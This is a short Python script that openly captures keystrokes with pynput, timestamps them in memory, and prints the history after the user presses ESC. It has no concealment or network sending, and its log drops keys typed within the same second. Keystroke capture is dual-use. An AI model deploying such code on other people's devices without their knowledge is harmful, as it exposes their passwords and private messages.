import pynput
from pynput.keyboard import Key, Listener
import datetime

# The file where the keystrokes will be logged
log_file = "key_log.txt"
keyloggers = {}

def on_press(key):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        keyloggers[current_time] = key.char
    except AttributeError:
        if key == Key.space:
            keyloggers[current_time] = "Space"
        elif key == Key.enter:
            keyloggers[current_time] = "Enter"
        else:
            keyloggers[current_time] = str(key)

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

def show_history():
    print("Keylogger History:")
    for timestamp, key in keyloggers.items():
        print(f"[{timestamp}] {key}")

def main():
    print("Keylogger started. Press ESC to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("Keylogger stopped.")
    while True:
        user_input = input("Do you want to see the keylogger history? (y/n): ")
        if user_input.lower() == "y":
            show_history()
        elif user_input.lower() == "n":
            break
        else:
            print("Invalid input. Please try again.")

if __name__ == "__main__":
    main()